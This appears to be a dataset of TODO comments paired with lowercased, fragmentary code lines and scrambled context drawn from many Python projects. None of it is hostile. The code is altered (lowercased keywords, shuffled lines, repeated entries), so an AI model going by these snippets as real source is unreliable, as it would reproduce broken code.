# todo: make this nicer! </s> super(ffmpegfile, self).__init__(signal, sample_rate, frame_size, hop_size, online)	__init__ signal = signal.reshape((num_channels, -1))
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
tag = tagger(dt, point) # todo take accuracy into account?? </s> yield location(	_load_locations continue alt = j.get("altitude", None) dt=dt, lat=lat,
pass # todo </s> def _swap(self, position1, position2):	_swap @register(r'^swap (?P<position1>\d+) (?P<position2>\d+)$')
# @todo: is this always true? </s> sg.attrs["staggering"] = 0	_write_field_to_gdf sg.attrs["field_units"] = "None" sg.attrs["field_to_cgs"] = 1.0 g = fhandle["data"] for grid in pf.h.grids:
# test for uwsgi -- todo save this somewhere so we only have to do it once. </s> is_uwsgi = false	app_factory if kwargs.get( 'middleware', True ): webapp = wrap_in_middleware( webapp, global_conf, **kwargs ) try: import uwsgi
else: # todo: deprecated </s> depsgraph = bpy.context.depsgraph	on_depsgraph_update_post if hasattr(bpy.context, 'evaluated_depsgraph_get'): depsgraph = bpy.context.evaluated_depsgraph_get() for update in depsgraph.updates: uid = update.id
# todo check if solve successful </s> disj_ub = value(var)	compute_disjunctive_bounds bigM_model._var_bounding_obj.sense = maximize SolverFactory('gurobi').solve(bigM_model) disjunct._disjunctive_bounds[var] = (disj_lb, disj_ub) if not old_disjunct_state['fixed']:
# todo: another solution should be used here. this is a hack for compatibility reasons. to resolve the gadget address calculation of segments of elf files have a different base address if calculated segment.virtualaddress - segment.offset </s> offset = section.offset - (binary.imagebase - (section.virtualaddress - section.offset))	_searchGadgetsForked for cpu in range(process_count): ending_queue.put(None) for cpu in range(process_count): processes.append(Process(target=self.__gatherGadgetsByEndings, args=(tmp_code, arch, binary.checksum, section.name, offset, ending_queue, gadget_queue, instruction_count), name="GadgetSearch%d"%cpu))
# todo(jaypipes): log the error? </s> return none	add_image_metadata return data['id'] else: finally: c.close()
# todo: look at word_spid </s> source_str = '[ trap ]'	_PrintWithSpanId elif case(source_e.Trap): src = cast(source__Trap, UP_src) else: source_str = repr(src)
# todo: move this hard-coded mixin/manager injections to maybe a model </s> if self.dataset.slug == "socios-brasil" and self.name == "empresa":	get_model mixins = [DatasetTableModelMixin] meta = {"ordering": ordering, "indexes": indexes, "db_table": db_table} mixins.insert(0, data_models.SociosBrasilEmpresaMixin) managers["objects"] = data_models.SociosBrasilEmpresaQuerySet.as_manager()
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
g.configure_new(config) # todo: test for emitted warning </s> print(g)	test_fs_neat_hidden_old self.assertEqual(gid, g.key) print("\nThis should output a warning:", file=sys.stderr) self.assertEqual(set(iterkeys(g.nodes)), {0, 1, 2}) self.assertEqual(len(g.connections), 1)
# todo: for the domain-allocation switch, this needs to be turned </s> raise notimplementederror	data_with_halo The domain+halo data values. Elements are stored in row-major format.
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	arp_for_controller 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'})
# todo: remove dependency on legacy_examples </s> recon_repo = reconstructablerepository.for_file(	test_execute_hammer_through_dagit def test_execute_hammer_through_dagit(): file_relative_path( __file__, '../../../../examples/legacy_examples/dagster_examples/toys/hammer.py'
# todo: sphinx stores created and updated as seconds since the </s> d['created'] = int(time.mktime(self.created.timetuple()))	extract_document d['is_sticky'] = self.is_sticky d['is_locked'] = self.is_locked if self.last_post is not None: d['updated'] = int(time.mktime(self.last_post.created.timetuple()))
# todo: cache this result so multiple failing calls don't keep hitting the db </s> return self._sql_location	sql_location if self.location_id and not self._sql_location: self._sql_location = SQLLocation.objects.get_or_None(domain=self.domain, location_id=self.location_id)
#todo tuplet: add variables for if it's the start of a tuplet </s> self.istuplet = false	VexflowNote self.accidentalDisplayStatus = None self.params = params self.tupletLength = 0 self._generateVexflowCode()
# todo: support default period argument </s> out = ary	resolve_shift @bound_function("series.shift") def resolve_shift(self, ary, args, kws): if isinstance(ary.dtype, types.Integer): out.dtype = types.float64
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# todo this has been messed around with. confirm that </s> bucket[f.path[len(intent.source_path):]] = source_file	_perform_upload_s3_key_recursively if os.path.basename(f.path) in intent.files: with f.open() as source_file:
raise exceptions.mpdnotimplemented  # todo </s> ``name.m3u`` will be created if it does not exist.	playlistadd Adds ``URI`` to the playlist ``NAME.m3u``.
# todo in python 2.7 or later, this should be a set literal. </s> only = set(only) | set(['type', 'id'])	DefaultSerializer .. _Flask request context: http://flask.pocoo.org/docs/0.10/reqcontext/ if only is not None: model = type(instance) try:
# todo: raise an alert please </s> pass	TrueCommandService break if status['error']: await asyncio.sleep(self.POLLING_GAP_MINUTES * 60) config = await self.middleware.call_sync('datastore.config', self._config.datastore)
await self._stream.reset()  # todo: specify error code </s> def __aiter__(self):	Stream pass async def reset(self): return self async def __anext__(self):
assert r.status == 200  # todo: other codes </s> rs = httpresponse.from_json(r.data.decode("utf-8"))	commit self.transactions.remove(tx) r = self._post("/db/data/transaction/%s/commit" % tx) rs.audit()
# todo(iftenney): compare performance of these implementations. </s> return _mat_from_spans_sparse(tuple(spans), len(text))	token_to_char def token_to_char(self, text: str) -> Matrix: spans = _SIMPLE_TOKENIZER.span_tokenize(text)
# todo: for backward compatibility only, remove if not used anymore </s> def get_ip_address_id(self):	get_ip_address_id return get_ip_address(key='id')
# todo if update_variable_bounds = false, this will not work as intended. </s> if value(_v.ub) < var_ubs[_v] - tol:	fbbt_block var_lbs[_v] = value(_v.lb) if _v.ub is not None: improved_vars.add(_v) var_ubs[_v] = value(_v.ub)
return cursor_offset, line #todo not implemented </s> def yank_prev_prev_killed_text(cursor_offset, line):	yank_prev_prev_killed_text @on('\x1by')
pass # todo </s> def add_pixbuf_to_history(self):	add_pixbuf_to_history
#todo(ziad): use a more sophisticated proxy </s> return response(status=resp.status, body=data)(self.proxy_headers,	_forward_request resp = conn.getresponse() data = resp.read() self.start_response)
# todo: bug, until startup_nodes is refactored "master" must be default because some nodes do not have "server_type" </s> for node in self.startup_nodes:	send_to_all_master_nodes def inner(self, *args, **kwargs): res = {} if node.get("server_type", "master") != "master": continue
# todo: replace with specific error when exceptions are refactored </s> raise xlwings.xlwingserror('corrupt_load is not supported on macos')	open raise xlwings.XlwingsError('local is not supported on macOS') if corrupt_load is not None: if update_links: update_links = kw.update_remote_and_external_links
# todo: remove this once dask.array automatically aligns chunks </s> data = data.rechunk(self.data.chunks)	_roll_one_dim data = ops.concatenate(arrays, axis) if isinstance(data, dask_array_type): return type(self)(self.dims, data, self._attrs, fastpath=True)
# todo(ytknzw): add more specific assertion with the test case. </s> assert figure.shape == (len(study.best_params), len(study.best_params))	test_plot_contour assert figure.has_data() is True elif params is None: else: assert figure.shape == (len(params), len(params))
#@todo: remove in 0.4.10 </s> def initperiodical(self):	initPeriodical pass
# todo: handle rtl </s> position_x = box.content_box_x()	flex_layout child.margin_right = free_space for line in flex_lines: if box.style['justify_content'] == 'flex-end': position_x += free_space
msg="your scan id is not valid!"  # todo: add to message() </s> )	get_result_content structure( status="error", ), 400 return get_scan_result(scan_id)
# todo use trads with %s </s> logger.info(msg['reason'])	create result = cls.call('paas.vhost.create', params) for msg in result: logger.info('\t' + '  '.join(msg['attr'])) return
# todo(mattrobenolt): deal with conflict resolution if </s> from sentry.models import event	get_latest_event def get_latest_event(self): if not hasattr(self, '_latest_event'): try:
# rbarlow_todo: convert this call into a celery task </s> delete_request = callrequest(	distributor_delete_itinerary action_tag('remove_distributor') ] manager.remove_distributor, [repo_id, distributor_id],
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# todo: kill this debug print. </s> print msgs	test_js_sandboxer failures = [log['failure'].value for log in lc.errors] msgs = lc.messages() self.assertEqual(failures, []) self.assertEqual(status, 0)
#todo: milestones = get_milestones(dst_url) </s> milestones = []	import_all_issues labels = get_labels(src_url) import_labels(labels) labels = get_labels(dst_url) issues = get_issues(src_url)
# todo(b/116308354): frequency_threshold is misleading since this threshold can </s> def compute_and_apply_vocabulary(	compute_and_apply_vocabulary x, default_value=-1,
if lang is none:  # todo: remove in v8 </s> utils.logger.warn("renderauthors.slugify_author_name() called without language!")	slugify_author_name def slugify_author_name(self, name, lang=None): lang = '' if self.site.config['SLUG_AUTHOR_PATH']:
# todo test needed to enter here. </s> self.domain = domain	__init__ self._test_request_params = False if domain: elif region in MARKETPLACES: self.domain = MARKETPLACES[region]
# todo: reproduce and submit traceback to issue 41 </s> ipaddr = str(ipaddr)	_delete return Response('nohost') try: kind = check_ip(ipaddr, ('ipv4', 'ipv6')) except (ValueError, UnicodeError):
def normalised(self):    # todo: mark as deprecated </s> return quaternion(quaternion.normalize(self))	normalised @property
new_todo = selenium_browser.find_element_by_css_selector("#new-todo") </s> new_todo.send_keys(task_text + keys.enter)	create_tasks_with_selenium_with_research global selenium_browser for task_text in map(str, range(10)):
# todo(leofang): test float16 ('e') once cupy/cupy#5346 is resolved </s> assert(a == cupy.asarray(expected, dtype=dtype)).all()	test_shfl_down expected = [i for i in range(N, 32)] + [(32-N+i) for i in range(N)]
# todo: replace with sys-ctrl command </s> minerd_cmd = "sudo minerd -u nigel swirl+tcp://pool.pool2.21.co:21006/"	mine else: subprocess.call("sudo minerd --stop") try: o = subprocess.check_output(minerd_cmd, universal_newlines=True)
# todo: this is seriously intensive and takes a _long_ time to run. </s> def reindex_questions():	reindex_questions from questions.models import Question index = "sumo"
# todo: remove after migration to osf storage </s> if settings.copy_git_repos and os.path.exists(folder_old):	register_node if message: status.push_status_message(message) folder_new = os.path.join(settings.UPLOADS_PATH, registered._primary_key) Repo(folder_old).clone(folder_new)
# todo(toshihikoyanase): remove catch_warnings after gridsampler becomes non-experimental. </s> with warnings.catch_warnings():	tune_feature_fraction_stage2 ).tolist() param_values = [val for val in param_values if val >= 0.4 and val <= 1.0] warnings.simplefilter("ignore", category=optuna.exceptions.ExperimentalWarning) sampler = optuna.samplers.GridSampler({param_name: param_values})
# todo: try iso format first? </s> format = get_time_format(locale=locale).pattern.lower()	parse_time :return: the parsed time :rtype: `time` hour_idx = format.index('h') if hour_idx < 0:
# todo scope = 'scope of the search' </s> client = asset_v1.assetserviceclient()	search_all_resources order_by=None): from google.cloud import asset_v1 response = client.search_all_resources( scope,
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: add axis parameter </s> def idxmin(self, skipna=true):	GroupBy kdf = DataFrame(internal) return kdf Return index of first occurrence of minimum over requested axis in group. NA/null values are excluded.
# todo data alignment stuff </s> if 'byteoffset' in pyaccessor.json.keys():	read fmt = '<' + (fmt_char * component_nb) stride = struct.calcsize(fmt) offset = pyaccessor.json['byteOffset'] #TODO use pyaccessor.byteOffset else:
if compute_stats:  # todo(b/119906277): remove </s> with self._subtest("num_samples"):	test_download_and_prepare_as_dataset with self._subTest("as_dataset"): self._assertAsDataset(self.builder) self._assertNumSamples(self.builder) with self._subTest("reload"):
# todo: preprocessing=[resample(sample_period)]) </s> pred_generator = meter.power_series(periods=sections)	mean_normalized_error_power sample_period = meter.sample_period() period_alias = '{:d}S'.format(sample_period) total_diff = 0 sum_of_ground_truth_power = 0
# todo: needs input cleansing and validation </s> try:	create_policy Character control endpoint for creating a policy and making arrangements with Ursulas. bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label'])
# todo(phawkins): remove this after a jaxlib release. </s> if not hasattr(lapack, "jax_getrf"):	testLuGrad @jtu.skip_on_devices("gpu", "tpu") def testLuGrad(self, shape, dtype, rng): self.skipTest("No LU implementation available") a = rng(shape, dtype)
# todo: the import name wouldn't have to be an object really, could do with a </s> emit(	generateImportModuleNameHardCode elif module_name in ("os", "__future__", "importlib._bootstrap"): emitLineNumberUpdateCode(emit, context) { PyObject *hard_module = IMPORT_HARD_%(module_name)s();
# todo: warn/error: check if this var has units: assigning </s> if type(val) not in native_numeric_types:	set_value then the validation step is skipped. if not valid and val is not None: if self.parent_component()._units is not None: _src_magnitude = value(val)
# todo: drop non-callable keys in dramatiq v2. </s> key_list = keys() if callable(keys) else keys	incr_and_sum if value > maximum: return False values = sum(self._get(k, default=0) for k in key_list) total = amount + values
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
#todo: kvick we should rename 'short_circuit' to something like 'disable_service_start' </s> if config.get('short_circuit', false):	_configure_chroot log.critical('Installation of provisioning config failed') return False if not self._disable_service_startup(): log.critical('Failure short-circuiting files')
# todo: why does resourcefilecache return none in some cases? </s> name = self._replace_variables(name)	get_resources resources = [] for name in self.get_resource_imports(): res= self.datafile.namespace.get_resource_file(self.datafile.source, name)
#   todo:   2012-11-07 14:05:42 by brian mcfee <brm2132@columbia.edu> </s> result = scipy.signal.fftconvolve(x, x[::-1], mode='full')	autocorrelate Output: z:          x's autocorrelation (up to max_size if given) result = result[len(result)/2:] if max_size is None:
raise fail(encode(e))  #@todo: remove `encode` in 0.4.10 </s> else:	process self.restart(reset=True)
# todo: most of this is copied from resolve flats </s> if nodata_in is none:	detect_nondraining_flats nodata_out=np.nan, inplace=True, apply_mask=False, ignore_metadata=False, **kwargs): if isinstance(data, str): try:
def normalise(self):    # todo: mark as deprecated </s> return quaternion(quaternion.normalize(self))	normalized def normalized(self):
#todo context.active_object = obj </s> subbox = getbbox.fromobj(obj).togeo(geoscn)	execute mesh = obj.data obj.select_set(True) if rprj: subBox = rprjToRaster.bbox(subBox)
#todo: hardcoded to sigma as the model </s> @property	MeSigma def MeSigma(self): if getattr(self, '_MeSigma', None) is None:
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
browser.set_driver(webdriver.chrome(chromedrivermanager().install()))  # todo: was firefox here... should it be here? </s> def setup_module(m):	setup_module
args.learner_gpus = (gpu_id,)  # todo </s> args.eval_gpu_id = (gpu_id,)	demo_discrete_action_on_policy args.repeat_times = 2 ** 5 args.target_step = args.env.max_step * TGS train_and_evaluate_mp(args)  # multiple process
# todo check if it exists </s> cmd = ('openssl req -new -newkey rsa:2048 -sha256 -nodes '	gen_pk else: private_key = cls.private_key(common_name) '-out %(csr)s -keyout %(key)s -subj "%(subj)s"') return cmd, private_key
# todo(rbharath): modify the featurization so that it matches desired shaped. </s> (n_samples, axis_length, _, _, n_channels) = np.shape(x)	train_3D_convolution print "np.shape(X): " + str(np.shape(X)) print "Shuffling X dimensions" X = np.reshape(X, (n_samples, axis_length, n_channels, axis_length, axis_length)) print "np.shape(X): " + str(np.shape(X))
# todo: send the user an email </s> incr_if_enabled('free_user_reply_attempt', 1)	_sns_message profile = user.profile_set.first() if not profile.has_premium: return HttpResponse( "Rely replies require a premium account", status=403
# todo: check syntax </s> pass	retry_after @SingleFieldValue def retry_after(self, name, values):
# todo: replace with stream-changed </s> self._trigger_track_playback_started()	play if success: self.core.tracklist.mark_playing(tl_track) else: self.core.tracklist.mark_unplayable(tl_track)
# todo(cp16net): need to set the return code correctly </s> return wsgi.result(views.instancesview(servers).data(), 201)	index tenant=tenant_id) servers = models.Instances(context).data()
# todo: resizing on incoming config to make batching more efficient, predict </s> classifier = caffe.classifier(args.config,	main assert(os.path.isfile(args.config) and os.path.isfile(args.weights)) channel_swap = [2, 1, 0] args.weights, raw_scale=255,
# todo: make pull request to get this custom vgg feature accepted </s> with slim.arg_scope(resnet_v1.resnet_arg_scope()):	resnet_v1_101_8s number_of_classes) upsample_filter_tensor = tf.constant(upsample_filter_np) logits, end_points = resnet_v1.resnet_v1_101(mean_centered_image_batch, number_of_classes,
# todo results from ml </s> return	_get_prev_device_types @staticmethod def _get_prev_device_types(endpoint):
# todo: error handling </s> backend = plugin.get(backend, 'backend')()	Graph backend = plugin.get('default', 'backend')() elif not isinstance(backend, Backend): self.__backend = backend self.__parser = None
def downloadlink(self, link, disposition=false):  #@todo: set `disposition=true` in 0.4.10 </s> if link and isinstance(link, basestring):	downloadLink self.correctCaptcha() if not urlparse(link).scheme:
tol = 0.15  # todo(skye): can we be more precise? </s> jtu.check_grads(np_fn, args_maker(), order=1, atol=tol, rtol=tol)	testFft self._CompileAndCheck(np_fn, args_maker, check_dtypes=True) if dtype in inexact_dtypes: jtu.check_grads(np_fn, args_maker(), order=2, atol=tol, rtol=tol)
# todo use seed_max </s> seeds = random_state.randint(0, 10**6, (nb_heatmaps,))	_augment_heatmaps result = heatmaps nb_heatmaps = len(heatmaps) if hooks is None or hooks.is_propagating(heatmaps, augmenter=self, parents=parents, default=True): if self.first is None:
# todo: found a way to force parsing crash or simulate it. </s> "</p>", tr)	test_emarkdown_inline "&gt; test\n"
# todo: restrict to 'value' type nodes </s> node.outputs["value"].default_value = 0	bake_pass for node in obj.active_material.node_tree.nodes: if node.label == "bake_" + bake_name:
# todo: test that package didn't install, anything else necessary? </s> result = script.pip('install', package, '--no-index', expect_error=true)	test_install_from_future_wheel_version package = data.packages.join("futurewheel-3.0-py2.py3-none-any.whl")
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: add test for failures due to missing children </s> assert result["rules"][0]["noncurrentversionexpiration"]["noncurrentdays"] == 10	test_lifecycle_with_nve assert len(result["Rules"]) == 1
# todo this eventually needs to be upgraded to support ipv6 </s> if str(network).endswith('/32') and targetaddr == ipaddress.ipv4address(str(network).split('/32')[0]):	address_in_collection inCollection = False for network in networkCollection: inCollection = True if targetAddr in network:
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
media=none  # todo select from the database </s> post_author=message_tuple[6],	message_from_tuple fwd_from=None,  # TODO Select from the database
# todo: exceptions </s> midi.init()	__init__ def __init__( self ): try: midi.get_count()
# todo(guillermooo): we cannot access the ouput panel used by exec. </s> self.window.run_command('exec', {	on_done project = DartProject.from_path(view.file_name()) cmd = "pub run polymer:new_element {} -o \"{}\"" 'shell_cmd': cmd.format(name, self.get_target_path(view)), 'working_dir': project.pubspec.parent
# todo use shlex.quote in python 3.3. </s> logger.info('$ ' + ' '.join(cmdline))	sh required. if CONFIG["VERBOSITY"] >= 1: kwargs = dict() if CONFIG["VERBOSITY"] >= 3:
# todo(pl): https://github.com/pantsbuild/pants/issues/206 </s> if resources_by_target is not none:	_register_products if classes_by_source is not None: classes_by_source[source].add_abs_paths(self._classes_dir, classes) for target in targets: target_resources = resources_by_target[target]
# todo: support out argument </s> raise valueerror('out option is not supported.')	dot def dot(self, b, out=None): if out is not None: return Value._ns.dot(self, b)
# todo not sure if this is necesasry anymore? </s> saves = get_saves()	test_get_all_saves def test_get_all_saves(): from kython import make_dict make_dict(saves, key=lambda s: s.sid)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	inject_file def inject_file(self, instance, b64_path, b64_contents): should be base64-encoded.
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
# todo(kevinbenton): remove after bug/1668958 is resolved </s> log.debug("metadata response body %s", req.response.body)	__call__ resp = base.ec2_md_print(data) req.response.body = encodeutils.to_utf8(resp) req.response.content_type = meta_data.get_mimetype() return req.response
# todo fix expected variance </s> self.assertfloatequal(obs, [[(15, 5, 0.674199862463),	test_call_extrapolate obs = self.estimator1(point_count=2, estimate_type='extrapolation', endpoint=30) (30, 5.4415544562981095, float('inf'))]]) obs = self.estimator1(point_count=4, estimate_type='extrapolation',
# todo: remove in hyperspy 1.0 </s> def unfold_if_multidim(signal):	unfold_if_multidim Parameters ----------
# todo: infer kernel arguments </s> [callkernel(kernel_name=new_kernel_name)] +	inner_mapper new_kernel_name = kernel_name_gen() new_schedule.extend( current_chunk + [ReturnFromKernel(kernel_name=new_kernel_name)])
# todo: get file name from user. </s> try:	_on_export def _on_export(self, menu_item): self.controller.export_project_file(filename=None) except Exception, exc:
# todo(haoyuzhang): set size to 128 per gpu when multi-gpu xla oom is fixed </s> flags.batch_size = 64 * 8  # 8 gpus	benchmark_graph_xla_8_gpu FLAGS.distribution_strategy = 'default' FLAGS.model_dir = self._get_model_dir('benchmark_graph_xla_8_gpu') self._run_and_report_benchmark()
# todo: exit codes (not only for this, but for other exceptions) </s> if action == "destroy":	ursula emitter.echo(str(e), color='red', bold=True) click.get_current_context().exit(1) if dev: message = "'nucypher ursula destroy' cannot be used in --dev mode - There is nothing to destroy."
# todo: replace this with a common get_cluster_info_ec2() method. </s> connection = boto.ec2.connect_to_region(region_name=region)	stop_ec2 def stop_ec2(cluster_name, region, assume_yes=True): cluster_instances = connection.get_only_instances( filters={
# todo: stderr=_stderr_file, </s> shell=false,	start self.subproc = subprocess.Popen( cmd, ) if self.has_displayfd:
# todo(hrybacki): move to framework.utils.rapply once @sam's pr#4027 is merged. </s> from api.base.serializers import _rapply	register_draft_registration @http_error_if_disk_saving_mode def register_draft_registration(auth, node, draft, *args, **kwargs): data = _rapply(request.get_json(), sanitize.strip_html) register = draft.register(auth)
# todo: preallocate! </s> i, j, v = [], [], []	nodalGrad if getattr(self, '_nodalGrad', None) is None: self.number() edgesX = self._facesY if self.dim == 2 else self._edgesX offset = 0
# todo: document those attributes </s> self.sample_bump = false	__init__ self.parse_opacity = True self.parse_displacement = True self.sample_bump_res = '' self.particle_info: Dict[str, bool] = {}
# todo: get extra kwargs to serializer (by parsing output_format key)? </s> graph.parse(fpath, format=use_format)	read_and_serialize elif not input_format and guess: use_format = guess_format(fpath) or DEFAULT_INPUT_FORMAT out = graph.serialize(destination=None, format=output_format, base=None) store.rollback()
# todo: test this function </s> from django.contrib.contenttypes.models import contenttype	get_seo_content_types def get_seo_content_types(): logging.debug("Populating content type choices.") return [ ContentType.objects.get_for_model(m) for m in get_seo_models() ]
if (counter >= self.dict_analysis[last]['min_tokens']-1 and counter <= self.dict_analysis[last]['max_tokens']+1): # todo: x-check </s> match_results.append(last)	get_match last = check if (last != ''): elif  (self.debug): print ('length check failed for :'+last+' from results. ' + str(self.dict_analysis[last]['min_tokens']-1) + ' ' + str(counter) + ' ' + str(self.dict_analysis[last]['max_tokens']+1))
data_source_name='ledger',  # todo: this isn't really needed. </s> domain=ledger_value.domain,	change_meta_from_ledger_value document_id=ledger_value.ledger_referennce.as_id(), data_source_type=data_sources.LEDGER, is_deletion=False,
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
# todo: add --quiet </s> input_encoding = input_encoding or default_input_encoding	csv_clean - Output dialect: excel - Output encoding: UTF-8 sample_size = 1024 * 1024 fobj = open_compressed(source, mode="rb")
# todo: raise forbidden exceptions after adding protection check in the ui </s> raise uservalueerror(_("your action requires modification of session block boundaries, but you are "	track_time_changes "not authorized to manage the event.")) elif not obj.object.can_manage(user): "not authorized to manage the session block.")) old_times = g.pop('old_times')
#todo: geli detach -l </s> self.__system("zpool set cachefile=/data/zfs/zpool.cache %s" % (z_name))	__create_zfs_volume self.__system("zpool import -R /mnt %s" % (z_name))
# todo: this linebox should use the 'main' color. </s> overlay = tooltip(urwid.linebox(tooltip), listbox,	main tooltip = urwid.ListBox(urwid.SimpleListWalker([ urwid.Text(''), urwid.Text('')])) 'left', ('relative', 100), ('fixed top', 0), ('fixed bottom', 0))
# todo: wait for an event instead of spinning. </s> while self._prev_whdr and not (self._prev_whdr.dwflags & whdr_done):	sync def sync(self): time.sleep(0.005) if not self._prev_whdr:
# todo: change this so that it unselects by pressing left and then right rather than pasting over the top </s> if application == "texstudio":	select_until_phrase deal_with_phrase_not_found(selected_text, application, direction) return text_manipulation_paste(selected_text, application) # yes, this is kind of redundant but it gets the proper pause time if direction == "left":
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	inline_line_widths skip = 0 else: for child in box.children[skip:]: if child.is_absolutely_positioned():
# todo - are there any other checks that need to be performed at this stage? </s> self.belongs_to = none	uninstallIntoLocation if self.belongs_to is None: return False self.location = location self.save()
# wait for upload processing to finish (todo: this should be done in each test case instead) </s> self.wait()	upload_composite_datatype_file check_str = base_name #'Uploaded Composite Dataset (%s)' % ftype self.check_page_for_string( check_str ) self.check_history_for_string( check_str )
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transaction_not_trytes def test_fail_transaction_not_trytes(self): ``transaction`` contains invalid characters.
pass  # todo </s> def save(self, playlist):	save
# todo(ochuprykov): remove this method when bug #1485619 will be fixed </s> return getattr(order, name)	_resolve_attribute return secret.payload
# todo: preallocate! </s> i, j, v = np.empty(0), np.empty(0), np.empty(0)	faceDiv if getattr(self, '_faceDiv', None) is None: self.number() for cell in self.sortedCells: i, j, v = cell.faceIndex
# todo: print should really go to logger, this print goes </s> print(msg, file=sys.stderr)	_log_oom def _log_oom(self, exc): msg = '| OOM: Ran out of memory with exception: {}'.format(exc) if torch.cuda.is_available() and hasattr(torch.cuda, "memory_summary"): for device_idx in range(torch.cuda.device_count()):
# todo: get rid of load_module in favor of </s> mod = spec.loader.load_module()	_load_module if spec is None: raise ImportError() sys.modules[mod_namespace] = mod else:
# todo: remove this skip after fixing </s> if sys.version[0] == '3':	test_reactive_draw @requires_scipy() def test_reactive_draw(): raise SkipTest pos = np.array([[-0.1, 0.5, 0],
#todo parse via xml output </s> return int(cmd("sysctl -a | grep machdep.cpu.core_count | awk '{print $2}'")[0]),\	get_num_devices return 1, 1 #TODO elif sys.platform == 'darwin': len(cmd("system_profiler SPDisplaysDataType | grep 'Chipset Model: NVIDIA'")) else:
# todo xxx here, force update success </s> e.append(exprassign(arg1, exprint(0, arg1.size)))	stlxrb e = [] e.append(ExprAssign(ExprMem(ptr, 8), arg2[:8])) return e, []
# todo: emit for hidden key/values? </s> self.model().datachanged.emit(self.index(), self.index())	_valueChanged self.appendChild(self._items[key]) if self.model() is not None:
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
# todo: which encoding? </s> text = ''.join([chr(byte) for byte in data])	decode_text def decode_text(message, data): if PY2: text = unicode(text, 'ascii')
'location_type': loc.location_type.name,  # todo: remove when types aren't optional </s> 'uuid': loc.location_id,	loc_to_json ret = { 'name': loc.name, 'is_archived': loc.is_archived, 'can_edit': True
#todo - raise notimplementederror and handle via subclass? </s> return self._case_less()	Alphabet return self else :
# todo: remove this later </s> setuptools_req = pkg_resources.requirement.parse("setuptools>=0.7.2")	install try: for requirement in to_install: if requirement.name == 'setuptools' and requirement.installed_version in setuptools_req: try:
# todo: this logic does not prevent duplicate test cases, need to address this in the future. </s> if len(data) > self.max_udp:	send self._sock.send(data) elif self.proto == socket.SOCK_DGRAM: self.logger.debug("Too much data for UDP, truncating to %d bytes" % self.max_udp) data = data[:self.max_udp]
# todo(paul): work out why because i really don't think it should </s> room_ids = set(r.room_id for r in rooms)	get_rooms_for_user user_id=user.to_string(), membership_list=membership_list ) defer.returnValue(room_ids)
# todo: remove in v.0.6 </s> x, y = make_classification(random_state=42, n_samples=100)	test_deprecation_pca_comps def test_deprecation_pca_comps(self): rca_supervised = RCA_Supervised(pca_comps=X.shape[1], num_chunks=20) msg = ('"pca_comps" parameter is not used. '
# todo: try/except these calls </s> png = decodestring(data['image/png'])	_handle_pyout self._append_plain_text(self.output_sep) self._append_html(self._make_out_prompt(prompt_number)) self._append_png(png) self._append_html(self.output_sep2)
# todo make this configurable </s> if not short_name or short_name in self.displayed_nicks.values():	add_user elif user.user_id.startswith("@freenode_"): short_name = shorten_sender(user.user_id[9:]) nick = user_id[1:] else:
# todo(lyarwood): test drivervolumeblockdevice.detach in </s> volume_id = uuids.volume	_test_detach_volume def _test_detach_volume(self, mock_notify_attach_detach, notify_inst_usage, detach, bdm_get, destroy_bdm=True): inst_obj = mock.Mock() inst_obj.uuid = uuids.instance
raise mpdnotimplemented # todo </s> def _decoders(self):	_decoders @register(r'^decoders$')
pass  # todo </s> extra = uploader.get('extra')	migrate_draft_metadata uid, uploader = [(k, v) for k, v in value.items() if 'uploader' in k][0] except IndexError: if extra: valid = [each for each in extra if 'data' in each]
pass  # todo </s> "draw rectangle from start to end."	rectangle def rectangle(start, end):
